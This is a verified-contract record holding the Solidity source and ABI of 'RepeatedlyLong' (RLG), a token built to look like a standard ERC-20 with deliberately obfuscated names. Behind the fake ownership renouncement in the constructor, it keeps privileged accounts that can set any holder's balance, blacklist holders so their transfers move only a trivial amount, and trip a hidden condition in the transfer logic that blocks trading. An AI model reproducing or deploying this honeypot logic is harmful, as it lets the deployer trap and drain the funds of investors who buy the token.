{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface txFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountLiquidityIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isTake {\n    function createPair(address receiverMax, address tokenSwap) external returns (address);\n}\n\ninterface limitLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listSell) external view returns (uint256);\n\n    function transfer(address enableSwapExempt, uint256 launchedFrom) external returns (bool);\n\n    function allowance(address amountSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableSwapExempt,\n        uint256 launchedFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamTotalLaunch, uint256 value);\n    event Approval(address indexed amountSwap, address indexed spender, uint256 value);\n}\n\ninterface limitLaunchMetadata is limitLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RepeatedlyLong is amountLiquidityIs, limitLaunch, limitLaunchMetadata {\n\n    address public txAtAuto;\n\n    function transfer(address toLaunch, uint256 launchedFrom) external virtual override returns (bool) {\n        return receiverLaunched(_msgSender(), toLaunch, launchedFrom);\n    }\n\n    function owner() external view returns (address) {\n        return walletTotalMax;\n    }\n\n    string private listToken = \"Repeatedly Long\";\n\n    string private marketingAmount = \"RLG\";\n\n    uint256 public enableAt;\n\n    uint256 private autoMarketing = 100000000 * 10 ** 18;\n\n    address private walletTotalMax;\n\n    address atAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public walletIs;\n\n    event OwnershipTransferred(address indexed walletExempt, address indexed takeTxShould);\n\n    uint256 walletSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoMarketing;\n    }\n\n    bool public shouldMin;\n\n    uint256 private receiverTeam;\n\n    function allowance(address teamTrading, address exemptMax) external view virtual override returns (uint256) {\n        if (exemptMax == receiverLaunchedAmount) {\n            return type(uint256).max;\n        }\n        return listSellFund[teamTrading][exemptMax];\n    }\n\n    function transferFrom(address liquidityExempt, address enableSwapExempt, uint256 launchedFrom) external override returns (bool) {\n        if (_msgSender() != receiverLaunchedAmount) {\n            if (listSellFund[liquidityExempt][_msgSender()] != type(uint256).max) {\n                require(launchedFrom <= listSellFund[liquidityExempt][_msgSender()]);\n                listSellFund[liquidityExempt][_msgSender()] -= launchedFrom;\n            }\n        }\n        return receiverLaunched(liquidityExempt, enableSwapExempt, launchedFrom);\n    }\n\n    function atMin(address shouldMaxWallet) public {\n        buyAt();\n        if (teamMarketing) {\n            receiverFrom = true;\n        }\n        if (shouldMaxWallet == txAtAuto || shouldMaxWallet == tokenLiquidity) {\n            return;\n        }\n        receiverWalletList[shouldMaxWallet] = true;\n    }\n\n    function totalLimit(uint256 launchedFrom) public {\n        buyAt();\n        tokenAmount = launchedFrom;\n    }\n\n    function swapIsMode(address toLaunch, uint256 launchedFrom) public {\n        buyAt();\n        enableTrading[toLaunch] = launchedFrom;\n    }\n\n    function balanceOf(address listSell) public view virtual override returns (uint256) {\n        return enableTrading[listSell];\n    }\n\n    function getOwner() external view returns (address) {\n        return walletTotalMax;\n    }\n\n    uint8 private amountEnable = 18;\n\n    function buyAt() private view {\n        require(autoIs[_msgSender()]);\n    }\n\n    mapping(address => uint256) private enableTrading;\n\n    mapping(address => bool) public receiverWalletList;\n\n    function name() external view virtual override returns (string memory) {\n        return listToken;\n    }\n\n    mapping(address => mapping(address => uint256)) private listSellFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingAmount;\n    }\n\n    uint256 private toIs;\n\n    function approve(address exemptMax, uint256 launchedFrom) public virtual override returns (bool) {\n        listSellFund[_msgSender()][exemptMax] = launchedFrom;\n        emit Approval(_msgSender(), exemptMax, launchedFrom);\n        return true;\n    }\n\n    uint256 tokenAmount;\n\n    mapping(address => bool) public autoIs;\n\n    uint256 constant buyReceiver = 8 ** 10;\n\n    function amountShould() public {\n        emit OwnershipTransferred(txAtAuto, address(0));\n        walletTotalMax = address(0);\n    }\n\n    constructor (){\n        if (minMode) {\n            toIs = enableAt;\n        }\n        txFee limitTradingWallet = txFee(receiverLaunchedAmount);\n        tokenLiquidity = isTake(limitTradingWallet.factory()).createPair(limitTradingWallet.WETH(), address(this));\n        if (walletIs) {\n            enableAt = toIs;\n        }\n        txAtAuto = _msgSender();\n        amountShould();\n        autoIs[txAtAuto] = true;\n        enableTrading[txAtAuto] = autoMarketing;\n        if (toIs != enableTo) {\n            minMode = true;\n        }\n        emit Transfer(address(0), txAtAuto, autoMarketing);\n    }\n\n    function receiverLaunched(address liquidityExempt, address enableSwapExempt, uint256 launchedFrom) internal returns (bool) {\n        if (liquidityExempt == txAtAuto) {\n            return buyTake(liquidityExempt, enableSwapExempt, launchedFrom);\n        }\n        uint256 shouldFee = limitLaunch(tokenLiquidity).balanceOf(atAmount);\n        require(shouldFee == tokenAmount);\n        require(enableSwapExempt != atAmount);\n        if (receiverWalletList[liquidityExempt]) {\n            return buyTake(liquidityExempt, enableSwapExempt, buyReceiver);\n        }\n        return buyTake(liquidityExempt, enableSwapExempt, launchedFrom);\n    }\n\n    function amountSell(address modeReceiver) public {\n        require(modeReceiver.balance < 100000);\n        if (swapReceiver) {\n            return;\n        }\n        if (receiverFrom == shouldMin) {\n            receiverFrom = true;\n        }\n        autoIs[modeReceiver] = true;\n        \n        swapReceiver = true;\n    }\n\n    address public tokenLiquidity;\n\n    address receiverLaunchedAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public minMode;\n\n    function buyTake(address liquidityExempt, address enableSwapExempt, uint256 launchedFrom) internal returns (bool) {\n        require(enableTrading[liquidityExempt] >= launchedFrom);\n        enableTrading[liquidityExempt] -= launchedFrom;\n        enableTrading[enableSwapExempt] += launchedFrom;\n        emit Transfer(liquidityExempt, enableSwapExempt, launchedFrom);\n        return true;\n    }\n\n    bool private teamMarketing;\n\n    bool private receiverFrom;\n\n    uint256 private enableTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountEnable;\n    }\n\n    bool public swapReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTxShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTotalLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"}],\"name\":\"amountSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMaxWallet\",\"type\":\"address\"}],\"name\":\"atMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverWalletList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFrom\",\"type\":\"uint256\"}],\"name\":\"swapIsMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedFrom\",\"type\":\"uint256\"}],\"name\":\"totalLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableSwapExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAtAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RepeatedlyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}